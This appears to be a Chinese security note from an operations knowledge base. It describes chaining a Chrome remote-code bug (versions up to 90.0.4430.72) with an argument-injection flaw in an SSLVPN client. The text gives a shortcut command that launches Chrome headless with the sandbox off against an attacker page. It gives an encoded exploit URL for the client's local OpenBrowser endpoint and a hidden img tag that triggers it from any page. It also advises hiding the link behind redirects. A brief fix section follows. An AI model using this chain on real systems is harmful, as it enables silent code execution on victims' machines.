---
id: "doc-16241a2a0be4"
title: "Chrome漏洞利用组合拳"
date: "2023-04-14T15:57:00"
categories: ["安全与堡垒机", "安全运维"]
tags: ["安全与堡垒机", "安全运维", "Windows", "漏洞", "知识笔记"]
source: "03-安全运营与应急/07-工作运维离线知识库/04-安全运维/birdben/68657805.html"
---

# Chrome漏洞利用组合拳

如果要在实战中该漏洞需要chrome游览器关闭沙箱漏洞才能利用成功。受害者如果已经打开游览器了无论受害者怎么点击快捷方式都不会以关闭沙箱方式打开，这里可以说是chrome的一个特性吧。chrome每次创建一个网页都会启动一个子进程。

这里需要考虑一种利用方式就是如果让chrome启动的时候创建一个和原游览器完全无关的一个游览器。
通过阅读Chrome启动参数文档发现 --user-data-dir= 能在启动的时候创建一个与原浏览器完全隔离的环境。

```html
存放数据文件指定到 C:/Windows/Temp/

--user-data-dir=C:/Windows/Temp/
使用无痕默认减少暴露痕迹

-incognito
对新创建的窗口进行隐藏

--headless
利用方式一：快捷方式

"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe" -incognito --headless --user-data-dir=C:/Windows/Temp/ --no-sandbox http://xx.xx.xx.xx/index.html
利用方式二：某SSLVPN X Chrome
hvv前期准备工作的时候想着部署各种反制蜜罐反控攻击者机器，在VICP平台看了公司研究院大佬Avscx的mac版客户端RCE的分析研究文章,未对url参数的值进行过滤导致的漏洞触发,主要是针对于mac端的一个利用。

hvv期间刚好Chrome 0day就爆了出来。于是就想到了Windows下可以通过传入启动参数的方式来进行利用。

利用条件
某SSLVPN

Google Chrome <= 90.0.4430.72 和 Microsoft Edge 没测试

EXP 编码前

https://203.0.113.1:54530/ECAgent/?op=OpenBrowser&arg={"url":" --no-sandbox -incognito --headless --user-data-dir=C:/Windows/Temp/ https://X.X.X.X/exp.html","type":"chrome","withShortcut":0}

EXP 编码后

https://203.0.113.1:54530/ECAgent/?op=OpenBrowser&arg=%7B%22url%22%3A%22 --no-sandbox -incognito --headless --user-data-dir%3DC%3A%2FWindows%2FTemp%2F https%3A%2F%2FX.X.X.X%2Fexp.html%22%2C%22type%22%3A%22chrome%22%2C%22withShortcut%22%3A0%7D
插入html中
<img hidden src="http://3t7.net/binfe">
可以在真正利用的时候对url做各种短链接，跳转好几次让受害者无法找真正的利用。

插入任意网页，使用任意的游览器和任意能发起url请求的软件都能触发。
```

![image-20210420212208983](../media/70d4c5d9a251714eae.png)

## 漏洞修复

升级Google Chrome 和 Microsoft Edge 浏览器的最新版。
(攻击者也可以调用Edge来触发执行)

安装SSLVPN客户端最新版。
~~暂时不用建议删除~~
